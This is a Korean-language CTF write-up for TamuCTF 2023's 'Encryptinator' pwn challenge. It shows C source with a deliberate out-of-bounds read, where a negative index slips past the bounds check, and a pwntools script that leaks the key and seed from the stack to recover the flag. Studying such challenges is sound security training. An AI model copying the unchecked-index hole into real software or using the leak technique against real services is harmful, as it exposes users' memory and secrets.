@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1914   I have made this super secure encryption engine. I’ll encrypt any message and no one will ever be able to read it. Not even me!Author: _mac_   [31 solves &#x2F; 491 p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tamu CTF 2023 - Encryptinator (pwn, oob read)">
+<meta property="og:url" content="https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1914   I have made this super secure encryption engine. I’ll encrypt any message and no one will ever be able to read it. Not even me!Author: _mac_   [31 solves &#x2F; 491 p">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-02T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-03T17:23:25.741Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="oob">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Tamu CTF 2023 - Encryptinator (pwn, oob read)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/230503-tamu2023-4.Randomness-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230503-tamu2023-8.Pwnme-pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&text=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&is_video=false&description=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tamu CTF 2023 - Encryptinator (pwn, oob read)&body=Check out this article: https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&title=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&name=Tamu CTF 2023 - Encryptinator (pwn, oob read)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/&t=Tamu CTF 2023 - Encryptinator (pwn, oob read)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tamu CTF 2023 - Encryptinator (pwn, oob read)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-02T22:00:00.000Z" itemprop="datePublished">2023-05-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/Tamu/">Tamu</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/oob/" rel="tag">oob</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li>
+</ul>
+<blockquote>
+<p>I have made this super secure encryption engine. I’ll encrypt any message and no one will ever be able to read it. Not even me!<br>Author: <code>_mac_</code></p>
+</blockquote>
+<ul>
+<li>[31 solves &#x2F; 491 points]</li>
+</ul>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드를 제공해준다. libc도 제공해줬다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_LEN 30</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">char</span>* iv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[len];</span><br><span class="line">    FILE *file;</span><br><span class="line">    </span><br><span class="line">    file = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(key, len, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">randomize</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">long</span> seed, <span class="type">unsigned</span> <span class="type">long</span> iterations)</span> &#123;</span><br><span class="line">    seed = seed * iterations + len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iterations &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        randomize(msg, len, seed, iterations- <span class="number">1</span>); <span class="comment">// 실행시켜야 스택이 높아져서 print_hex할 때 encrypt함수의 key 값이 남아있음</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        encrypt(msg, len, ((<span class="type">char</span> *) &amp;seed)); <span class="comment">// 안그러면 key 값이 덮혀서 안보임</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSelect from the options below:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. Encrypt a message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. View the encrypted message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. Quit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;option);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">console</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">long</span> seed;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> read_len;</span><br><span class="line">    <span class="type">char</span> buf[MAX_LEN] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(menu()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">// get user input</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter message to encrypt: &quot;</span>);</span><br><span class="line">                fgets(buf, MAX_LEN-FLAG_LEN, <span class="built_in">stdin</span>);</span><br><span class="line">                len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add flag to the buffer</span></span><br><span class="line">                file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">                fread(buf + len, FLAG_LEN, <span class="number">1</span>, file);</span><br><span class="line">                fclose(file);</span><br><span class="line">                len += FLAG_LEN;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// encrypt</span></span><br><span class="line">                seed = ((<span class="type">long</span>) rand()) &lt;&lt; <span class="number">32</span> + rand();</span><br><span class="line">                randomize(buf, len, seed, buf[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span>(len == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you need to encrypt a message first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nRead a substring of the encrypted message.&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter the starting index (%d - %d): &quot;</span>, index, len);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">                <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (index &gt; len) &#123; </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error, index out of bounds.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your encrypted string with the flag:\n&quot;</span>);</span><br><span class="line">                print_hex(buf+index, len - index); <span class="comment">// oob read</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;goodbye.\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;There was an error processing that request, please try again.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); </span><br><span class="line">    upkeep();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// welcome</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my encryption engine: ENCRYPT-INATOR!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll encrypt anything you want but no guarantees you&#x27;ll be able to decrypt it,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I haven&#x27;t quite figured out how to do that yet... :(\n&quot;</span>); </span><br><span class="line">    console();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2번 메뉴에서 <code>index</code>가 음수가 가능하기 때문에 <code>print_hex(buf+index, len - index);</code>에서 <code>oob</code>가 발생할 수 있다. <code>buf</code> 이전에 있는 것을 출력할 수 있다. 이것으로 <code>seed</code>와 <code>key</code>를 구할 수 있다.</p>
+<p>사실상 <code>seed</code>와 <code>key</code>만 알면 <code>flag</code>는 바로 구할 수 있을 것 같다. 참고로 encrypt된 flag도 <code>print_hex(buf+index, len - index);</code>를 통해서 바로 구할 수 있기 때문에 당연히 <code>flag</code>를 계산할 수 있다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">    msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>xor</code>을 한 번 더 진행하면 된다.</p>
+<p><code>key</code>를 leak할 때 주의해야할 것이 있다. 주석에도 써놨듯이 <code>randomize()</code> 함수에서 <code>iteration</code>이 1 이상이어야 <code>randomize(msg, len, seed, iterations- 1);</code> 을 한 번 더 호출하는데, 이렇게 해야지 stack이 높아져서 <code>key</code> 값이 남아있다.</p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;encryptinator&quot;</span>) </span><br><span class="line"><span class="comment"># p = process(&#x27;./encryptinator&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./encryptinator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4800</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">key_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key_leak&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key_leak))</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    key.append(<span class="built_in">int</span>(key_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4648</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">seed_leak = p.recvline()[:<span class="number">8</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed_leak))</span><br><span class="line"></span><br><span class="line">seed = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">    seed.append(<span class="built_in">int</span>(seed_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">flag_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    flag.append(<span class="built_in">int</span>(flag_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag[i] = flag[i] ^ key[i] ^ seed[i % <span class="number">8</span>]</span><br><span class="line">    real_flag.append(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;####&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;&#x27;</span>.join(real_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(real_flag))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;00ps_b4d_3rr0r_ch3ck1ng&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
